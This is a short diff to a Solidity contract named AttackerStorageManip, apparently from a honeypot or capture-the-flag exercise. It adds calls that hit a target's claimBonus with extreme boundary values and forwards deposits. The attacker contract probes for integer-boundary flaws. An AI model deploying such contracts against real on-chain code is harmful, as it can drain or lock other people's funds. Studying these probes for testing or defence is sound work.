@@ -3,6 +3,7 @@ pragma solidity ^0.8.24;
 
 interface IHoneypot {
     function claimBonus(uint256) external;
+    function deposit() external payable;
 }
 
 contract AttackerStorageManip {
@@ -19,6 +20,12 @@ contract AttackerStorageManip {
             slots[i] = i * 0xdeadbeef;
             arr[i]   = block.number + i;
         }
-        try honeypot.claimBonus(999) {} catch {}
+
+        honeypot.claimBonus(type(uint256).max);
+        honeypot.claimBonus(uint256(type(uint128).max) + 1);
+
+        if (msg.value > 0) {
+            honeypot.deposit{value: msg.value}();
+        }
     }
 }
